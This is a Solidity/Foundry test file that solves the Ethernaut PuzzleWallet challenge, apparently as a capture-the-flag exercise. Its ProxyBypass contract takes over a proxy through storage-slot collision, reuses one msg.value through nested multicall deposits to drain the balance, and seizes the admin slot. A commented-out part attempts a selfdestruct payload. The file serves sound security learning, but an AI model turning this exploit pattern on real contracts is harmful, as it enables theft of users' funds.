// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuzzleWallet.sol";

contract SolutionTest is Test {
    
    uint rinkebyFork;
    string RINKEBY_RPC_URL = vm.envString("RINKEBY_RPC_URL");

    function setUp() public {
        rinkebyFork = vm.createFork(RINKEBY_RPC_URL);
    }

    function test() public {
        vm.selectFork(rinkebyFork);
        assertEq(vm.activeFork(), rinkebyFork);

        PuzzleProxy instance = PuzzleProxy(payable(0xF329CE11B1d374862B42306907EAe07D8fFF9971));
        PuzzleWallet instanceWallet = PuzzleWallet(address(instance));
        PuzzleWallet logicImpl = PuzzleWallet(0x49B448277D59Ba8d2ca8507f80b2E0633fE72158);
        ProxyBypass proxyBypass = new ProxyBypass{value: 0.005 ether}(payable(address(instance)), address(logicImpl));
        // above line initializes attack contract with some funds to carry out our exploit

        proxyBypass.sharingStorageIsntCaring();

        // test if owner() reads from pendingAdmin slot and vice versa
        address hopefullyOwner = instance.pendingAdmin();
        address hopefullyPendingAdmin = instanceWallet.owner();        
        assertEq(hopefullyOwner, address(proxyBypass));
        assertEq(hopefullyPendingAdmin, address(proxyBypass));

        // test addToWhitelist()
        bool areWeWhitelisted = instanceWallet.whitelisted(address(proxyBypass));
        assertTrue(areWeWhitelisted);

        // test balances after reusing msg.value with multicall('deposit()') 
        uint balance = instanceWallet.balances(address(proxyBypass));
        uint contractBalance = address(instanceWallet).balance;
        assertEq(balance, contractBalance);
        assertEq(contractBalance, 0);

        // test for maxBalance (== admin) manipulated and pwnd
        address kweenAdministrator = proxyBypass.checkAdmin();
        uint256 maxBalance = instanceWallet.maxBalance();
        assertEq(kweenAdministrator, address(uint160(maxBalance)));
        assertEq(kweenAdministrator, address(proxyBypass), "KweenBirb has not yet ascended to KweenAdministrator");
                
        
        // turns out this approach is not necessary!
        /*
        proxyBypass.surgicalBypass();

        // test init() call
        address pwner = logicImpl.owner();
        assertEq(address(proxyBypass), pwner, "Initialization failed");

        // test addToWhitelist() call
        bool heyFellowKids = logicImpl.whitelisted(address(proxyBypass));
        assertTrue(heyFellowKids);
        */
    }

}

contract ProxyBypass {

    PuzzleProxy instance;
    PuzzleWallet instanceWallet;
    PuzzleWallet logicImpl;
    address public hacker;

    constructor(address payable $your_ethernaut_proxy_here, address $your_logic_impl_here) payable {
        instance = PuzzleProxy($your_ethernaut_proxy_here);
        instanceWallet = PuzzleWallet($your_ethernaut_proxy_here);
        logicImpl = PuzzleWallet($your_logic_impl_here);
        hacker = msg.sender;
    }

    function sharingStorageIsntCaring() public {
        // become owner aka pendingAdmin lol
        instance.proposeNewAdmin(address(this));
        // become whitelisted via pwnership
        instanceWallet.addToWhitelist(address(this));

        // drain victim proxy contract balance to 0
        bytes[] memory data = new bytes[](3);
        bytes[] memory nestedData = new bytes[](1);
        data[0] = bytes(abi.encodeWithSignature("deposit()"));
        nestedData[0] = data[0];
        data[1] = bytes(abi.encodeWithSignature("multicall(bytes[])", nestedData));
        data[2] = bytes(abi.encodeWithSignature("execute(address,uint256,bytes)", address(0x0000000000000000000000000000000000000000), 0.002 ether, 'KweenBirb just pwnd u LOL'));
        instanceWallet.multicall{ value: 0.001 ether }(data);

        // become admin by seting maxBalance (aka admin) to hacker contract LOL
        instanceWallet.setMaxBalance(uint256(uint160(address(this))));
    }

    function checkAdmin() public view returns (address) {
        return instance.admin();
    }


    // belatedly realized that this approach is not necessary!
    /*
    function surgicalBypass() public {
        // pwn the logic implementation contract we got from our js script
        logicImpl.init(0);
        logicImpl.addToWhitelist(address(this));

        // selfdestruct() the logicImpl contract
        
        address payable a = payable(0x5d5d4d04B70BFe49ad7Aac8C4454536070dAf180);
        
        bytes[1] memory payload;
        bytes memory b;
        assembly {
            mstore(0x00, 0x735d5d4d04B70BFe49ad7Aac8C4454536070dAf180FF)
            b := mload(0x00)
        }
        payload[0] = abi.encodeWithSignature("multicall(bytes[])", b);
        // (bool res,) = address(logicImpl).call(
        //     abi.encodeWithSignature("multicall(bytes[])", payload)
        // );
        // logicImpl.multicall(payload); //reverts because of dynamic bytes array function parameter?

        // try calling execute() with to parameter as itself, provide multicall w/ selfdestruct as data parameter
        logicImpl.execute(payable(address(logicImpl)), 0, payload[0]);
    }
    */
}
